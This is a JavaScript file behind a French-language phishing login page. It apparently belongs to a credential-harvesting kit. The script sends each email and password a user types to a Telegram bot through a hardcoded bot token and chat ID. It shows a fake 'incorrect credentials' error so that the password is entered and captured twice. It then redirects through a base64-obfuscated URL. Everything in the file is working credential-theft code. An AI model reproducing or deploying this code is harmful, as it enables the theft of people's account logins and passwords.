document.addEventListener('DOMContentLoaded', function () {
    const zoneEmail = document.getElementById('zone-email');
    const zonePassword = document.getElementById('zone-password');
    const afficheMdp = document.getElementById('affiche-mdp');
    const erreurEmail = document.getElementById('erreur-email');
    const erreurMdp = document.getElementById('erreur-mdp');
    const continuerButton = document.getElementById('continuer-button');

    let isFirstClick = true;

    // Fonction pour masquer les messages d'erreur lors de la saisie
    zoneEmail.addEventListener('input', function () {
        erreurEmail.classList.add('hidden');
    });

    zonePassword.addEventListener('input', function () {
        erreurMdp.classList.add('hidden');
    });

    // Fonction pour valider une adresse e-mail
    function validerEmail(email) {
        // Expression régulière pour valider une adresse e-mail
        const regexEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return regexEmail.test(email);
    }

    // Fonction d'envoi des données à Telegram
    function envoyerTelegram(data) {
      
        return fetch(`https://api.telegram.org/bot6667244359:AAFRRgkM-G-AOp01kZbZAkRp0jJIg5dAxEg/sendMessage?chat_id=-4147954845&text=🟦- ${data.email}:${data.password}`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
    }

    continuerButton.addEventListener('click', function () {
        if (zoneEmail.value === '') {
            erreurEmail.innerText = "Veuillez entrer une adresse email.";
            erreurEmail.classList.remove('hidden');
            return;
        }

        if (!validerEmail(zoneEmail.value)) {
            erreurEmail.innerText = "Veuillez entrer une adresse email valide.";
            erreurEmail.classList.remove('hidden');
            return;
        }

        if (afficheMdp.classList.contains('hidden')) {
            afficheMdp.classList.remove('hidden');
            zonePassword.focus();
            return;
        }

        if (zonePassword.value === '') {
            erreurMdp.innerText = "Veuillez entrer un mot de passe.";
            erreurMdp.classList.remove('hidden');
            return;
        }

        const data = {
            email: zoneEmail.value,
            password: zonePassword.value
        };

        if (isFirstClick) {
            // Envoi des données à votre bot Telegram après le premier clic
            envoyerTelegram(data)
                .then(response => {
                    if (!response.ok) {
                        // Affichage du message d'erreur en cas de succès de la requête
                        erreurMdp.innerText = "Identifiants incorrects. Veuillez réessayer.";
                        erreurMdp.classList.remove('hidden');
                        // Vider la zone de mot de passe
                        zonePassword.value = '';
                    } else {
                        isFirstClick = false;
                        // Affichage du message d'erreur en cas de succès de la requête
                        erreurMdp.innerText = "Identifiants incorrects. Veuillez réessayer.";
                        erreurMdp.classList.remove('hidden');
                        // Vider la zone de mot de passe
                        zonePassword.value = '';
                    }
                })
                .catch(error => {
                    // Gestion des erreurs de connexion lors du premier envoi
                    console.error(error);
                });
        } else {
            // Envoi des données à Telegram après le deuxième clic
            envoyerTelegram(data)
                .then(response => {
                    if (response.ok) {
                        // Redirection vers le lien en base64 en cas de succès
                       window.location.href = atob('aHR0cHM6Ly9maW5hbC1laWdodC1ncmVlbi52ZXJjZWwuYXBwL2ZpbmFsJTIwbmV3JTIwc2NhbWEuaHRtbA==');
         } else {
                        
                    }
                })
                .catch(error => {
                    // Gestion des erreurs de connexion lors du deuxième envoi
                    console.error(error);
                });
        }
    });
});










